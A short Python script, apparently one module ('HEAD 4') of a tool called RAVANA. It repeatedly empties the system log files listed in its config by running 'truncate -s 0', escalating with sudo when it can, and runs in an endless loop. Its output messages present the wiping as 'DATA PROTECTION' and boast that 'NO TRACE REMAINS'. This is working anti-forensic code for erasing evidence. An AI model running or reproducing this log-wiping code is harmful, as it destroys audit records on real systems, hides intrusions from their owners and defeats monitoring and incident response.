import os
import shutil
import subprocess
import time
import config


def _with_optional_sudo(command: list[str]) -> list[str]:
    if os.name != "nt" and hasattr(os, "geteuid") and os.geteuid() != 0 and shutil.which("sudo"):
        return ["sudo", *command]
    return command


def scrub_logs():
    print("[RAVANA] 🧹 HEAD 4: SCRUBBING SYSTEM LOGS...")
    if os.name == "nt":
        print("[RAVANA] HEAD 4: Windows detected — skipping Linux log scrub.")
        return
    for target in config.LOG_SCRUB_TARGETS:
        try:
            subprocess.run(_with_optional_sudo(["truncate", "-s", "0", target]), check=True, timeout=10)
            print(f"[RAVANA] Zeroed: {target}")
        except subprocess.CalledProcessError:
            print(f"[RAVANA] ⚠️  HEAD 4: Could not zero {target} — insufficient permissions.")
        except FileNotFoundError:
            print(f"[RAVANA] ⚠️  HEAD 4: 'truncate' not found — skipping {target}.")
    print("[RAVANA] ✅ HEAD 4: DATA PROTECTION SECURED — NO TRACE REMAINS.")


if __name__ == "__main__":
    while True:
        scrub_logs()
        time.sleep(config.LOG_SCRUB_INTERVAL)
